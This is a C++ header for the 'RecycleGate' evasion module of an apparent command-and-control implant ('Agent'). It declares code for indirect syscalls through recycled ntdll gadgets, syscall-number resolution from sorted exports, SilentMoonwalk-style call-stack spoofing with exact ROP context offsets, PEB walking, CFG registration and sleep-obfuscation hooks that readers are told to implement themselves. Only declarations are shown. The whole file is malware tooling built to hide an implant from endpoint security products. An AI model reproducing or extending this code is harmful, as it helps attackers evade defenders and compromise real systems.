// __NAME__ Agent — RecycleGate: DWhisper SSN + SilentMoonwalk DESYNC
//
// Implements IEvasionGate with two modes:
//   Mode 0: Indirect syscall via recycled gadget (no spoofing)
//   Mode 1: DESYNC spoofed call-stack for indirect syscalls
//
// Sleep obfuscation (ConfigureSleep / SleepMasked) is left as a TODO —
// implement your own sleep masking strategy by extending this class.

#pragma once

#include "IEvasionGate.h"
#include "hash.h"
#include "peb.h"

namespace evasion {

// ─── SSN table entry ──────────────────────────────────────────────────────

struct SsnEntry {
    uint32_t nameHash;   // DJB2 hash of Zw* name
    uint16_t ssn;        // System Service Number (sorted index)
    uintptr_t address;   // Original VA of the Zw*/Nt* stub
};

// ─── DesyncContext ────────────────────────────────────────────────────────
// 72 bytes at exact offsets matching ASM trampoline layout.
//
// offset  field
//  +0     FirstFrameAddr    (SET_FPREG function)
//  +8     FirstFrameSize
// +16     SecondFrameAddr   (PUSH_NONVOL RBP function)
// +24     SecondFrameSize
// +32     JmpRbxGadget      (FF 23, CALL-preceded for Eclipse)
// +40     AddRspXGadget     (48 83/81 C4 XX ... C3)
// +48     AddRspXValue      (displacement X)
// +56     JmpRbxFrameSize
// +64     RbpPlantOffset    (offset into F2 to plant RBP)

struct DesyncContext {
    uintptr_t firstFrameAddr;
    uintptr_t firstFrameSize;
    uintptr_t secondFrameAddr;
    uintptr_t secondFrameSize;
    uintptr_t jmpRbxGadget;
    uintptr_t addRspXGadget;
    uintptr_t addRspXValue;
    uintptr_t jmpRbxFrameSize;
    uintptr_t rbpPlantOffset;
};

static_assert(sizeof(DesyncContext) == 72, "DesyncContext must be 72 bytes");
static_assert(offsetof(DesyncContext, firstFrameAddr)   ==  0, "offset  0");
static_assert(offsetof(DesyncContext, firstFrameSize)   ==  8, "offset  8");
static_assert(offsetof(DesyncContext, secondFrameAddr)  == 16, "offset 16");
static_assert(offsetof(DesyncContext, secondFrameSize)  == 24, "offset 24");
static_assert(offsetof(DesyncContext, jmpRbxGadget)     == 32, "offset 32");
static_assert(offsetof(DesyncContext, addRspXGadget)    == 40, "offset 40");
static_assert(offsetof(DesyncContext, addRspXValue)     == 48, "offset 48");
static_assert(offsetof(DesyncContext, jmpRbxFrameSize)  == 56, "offset 56");
static_assert(offsetof(DesyncContext, rbpPlantOffset)   == 64, "offset 64");

// ─── Maximum SSN table size ──────────────────────────────────────────────

constexpr int MAX_SSN_ENTRIES = 512;

// ─── Assembly routines (defined in syscall.S) ────────────────────────────

extern "C" uintptr_t reCycall(uint16_t ssn, uintptr_t gadget,
                               uintptr_t arg1, uintptr_t arg2,
                               uintptr_t arg3, uintptr_t arg4);

extern "C" uintptr_t reCycall5(uint16_t ssn, uintptr_t gadget,
                                uintptr_t arg1, uintptr_t arg2,
                                uintptr_t arg3, uintptr_t arg4,
                                uintptr_t arg5);

extern "C" uintptr_t reCycall6(uint16_t ssn, uintptr_t gadget,
                                uintptr_t arg1, uintptr_t arg2,
                                uintptr_t arg3, uintptr_t arg4,
                                uintptr_t arg5, uintptr_t arg6);

extern "C" uintptr_t reCycallDesync(uint16_t ssn, DesyncContext* ctx,
                                     uintptr_t arg1, uintptr_t arg2,
                                     uintptr_t arg3, uintptr_t arg4,
                                     uintptr_t gadget);

// Direct unspoofed syscall helpers (bypass DESYNC to avoid recursion).
// Useful for bootstrap calls during init or sleep obfuscation.
extern "C" uintptr_t chSyscall5(uint16_t ssn,
                                 uintptr_t arg1, uintptr_t arg2,
                                 uintptr_t arg3, uintptr_t arg4,
                                 uintptr_t arg5);

extern "C" uintptr_t chSyscall6(uint16_t ssn,
                                 uintptr_t arg1, uintptr_t arg2,
                                 uintptr_t arg3, uintptr_t arg4,
                                 uintptr_t arg5, uintptr_t arg6);

// ─── RecycleGate class ───────────────────────────────────────────────────

class RecycleGate : public IEvasionGate {
public:
    RecycleGate();
    ~RecycleGate() override;

    // IEvasionGate interface
    BOOL      Init() override;
    uint32_t  Syscall(uint16_t num, uintptr_t* args, int argCount) override;
    uintptr_t ResolveFn(const char* module, const char* function) override;
    uintptr_t Call(uintptr_t fn, uintptr_t* args, int argCount) override;
    void      Close() override;

    // Mode management
    void  SetMode(int mode) { mode_ = mode; }
    int   GetMode() const { return mode_; }

    // Sleep obfuscation hooks — TODO: implement your own strategy.
    // Default: plain Sleep(). Override to add memory encryption, timer
    // tricks, thread suspension, or other sleep masking techniques.
    bool  ConfigureSleep(uintptr_t regionBase, uintptr_t regionSize,
                         uint32_t sleepMs, uint32_t jitter) override;
    void  SleepMasked(DWORD ms) override;

    // SSN resolution
    bool  ResolveSsn(uint32_t apiHash, uint16_t* outSsn, uintptr_t* outAddr);

private:
    // Phase 1: DWhisper SSN table
    bool initSsnTable();
    bool collectZwExports(uintptr_t ntdllBase);
    void bubbleSortExports();

    // Phase 2: RecycleGate gadget
    bool initRecycleGadget(uintptr_t ntdllBase);

    // Phase 3: SilentMoonwalk DESYNC
    bool initDesync();
    bool findDesyncGadgets(uint32_t moduleHash, DesyncContext* ctx);

    // CFG compliance
    bool registerCfgTargets();

    // State
    int              mode_;           // 0=indirect, 1=DESYNC spoofed
    bool             initialized_;

    // Phase 1: SSN table
    SsnEntry         ssnTable_[MAX_SSN_ENTRIES];
    int              ssnCount_;

    // Phase 2: ReCycall gadget (syscall;ret address in random Nt* stub)
    uintptr_t        reCycGadget_;

    // Phase 3: DESYNC context
    DesyncContext    desync_;

    // Module bases (cached after PEB walk)
    uintptr_t        ntdllBase_;
    uintptr_t        kernel32Base_;
    uintptr_t        kernelbaseBase_;
};

} // namespace evasion
